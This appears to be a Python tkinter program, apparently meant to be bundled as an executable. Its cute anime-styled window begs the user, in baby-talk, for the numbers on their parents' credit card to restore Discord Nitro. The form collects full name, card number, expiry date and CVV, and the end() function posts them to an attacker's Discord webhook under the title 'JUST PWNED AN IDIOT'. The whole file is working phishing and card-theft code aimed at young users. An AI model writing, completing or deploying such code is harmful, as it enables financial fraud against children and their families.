import tkinter as tk
from tkinter import messagebox
import tkinter.font as tkFont
from PIL import ImageTk, Image
from discord_webhook import DiscordWebhook, DiscordEmbed
import os, sys

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS # type: ignore
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# INITIALIZE WINDOW
window = tk.Tk()
window.title("H- Hii! UwU I have a r- request senpai~")
window.resizable(width=False, height=False)

# INITIALIZE VARIABLES
name_var = tk.StringVar()
card_var = tk.StringVar()
sec_var = tk.StringVar()
exp_var = tk.StringVar()

# SETTING THE ICON
icon = tk.PhotoImage(file=resource_path("icon.png"))
window.iconphoto(False, icon)

# SETTING MAIN CANVAS
canvas = tk.Canvas(window, width=600, height=250)
canvas.pack()

# CUTE GIRL IMAGE
imgframe = tk.Frame(window, width=300, height=250)
imgframe.pack()
imgframe.place(anchor='center', relx=0.25, rely=0.5)

img = ImageTk.PhotoImage(Image.open(resource_path("cry.jpg")))
imglabel = tk.Label(imgframe, image = img)
imglabel.pack()

# LABEL FOR MESSAGE
msglabel=tk.Label(window)
msglabel["anchor"] = "center"
ft = tkFont.Font(family='Times',size=10)
msglabel["font"] = ft
msglabel["fg"] = "#333333"
msglabel["justify"] = "center"
msglabel["text"] = "A- Arigato senpai!! My nitro just e- expired T_T \n Would you p- pwease care to tell the numbers on \n your pawents cwedit cawd? Nyaa~ UwU \n That will b- bring back my n- nitro!! \n User-san daisukii!! OwO"
msglabel.place(x=310,y=0,width=263,height=105)

# INFO FOR NAME
namelabel=tk.Label(window)
namelabel["text"] = "Full Name"
namelabel["anchor"] = "center"
namelabel.place(x=280,y=120,width=60,height=10)

nameentry=tk.Entry(window, textvariable=name_var)
nameentry.place(x=370,y=118,width=200,height=18)

# INFO FOR CARD NUMBER
cnumber=tk.Label(window)
cnumber["text"] = "Card Number"
cnumber["anchor"] = "center"
cnumber.place(x=278,y=160,width=80,height=10)

centry=tk.Entry(window, textvariable=card_var)
centry.place(x=370,y=158,width=200,height=18)

# INFO FOR EXPIRY
enumber=tk.Label(window)
enumber["text"] = "Expiry Date"
enumber["anchor"] = "center"
enumber.place(x=272,y=195,width=80,height=15)

eentry=tk.Entry(window, textvariable=exp_var)
eentry.place(x=370,y=193,width=200,height=18)

# INFO FOR CVV
cvvnumber=tk.Label(window)
cvvnumber["text"] = "Security Number"
cvvnumber["anchor"] = "center"
cvvnumber.place(x=280,y=230,width=90,height=15)

cvventry=tk.Entry(window, textvariable=sec_var)
cvventry.place(x=390,y=228,width=50,height=18)

def end():

    name = name_var.get()
    card = card_var.get()
    exp = exp_var.get()
    sec = sec_var.get()
    
    webhook = DiscordWebhook(url="INSERT DISCORD WEBHOOK URL HERE")
    embed = DiscordEmbed(title="JUST PWNED AN IDIOT", description="loli comes with a card! hehe", color="03b2f8")
    embed.set_author(name="made by baka")
    
    embed.add_embed_field(name="Name", value=name)
    embed.add_embed_field(name="Card Number", value=card)
    embed.add_embed_field(name="Expiry Date", value=exp)
    embed.add_embed_field(name="CVV", value=sec)

    webhook.add_embed(embed)

    response = webhook.execute()

    ok = messagebox.showinfo(title="Arigato Senpai~~", message="Thank you fow the info!! Now I can h- have nitwo!! UwU")
    
    if(ok):
        window.destroy()

btn = tk.Button(text="A- Arigato!!", command = end)
btn.place(x=520, y=220)

# MAIN LOOP
window.mainloop()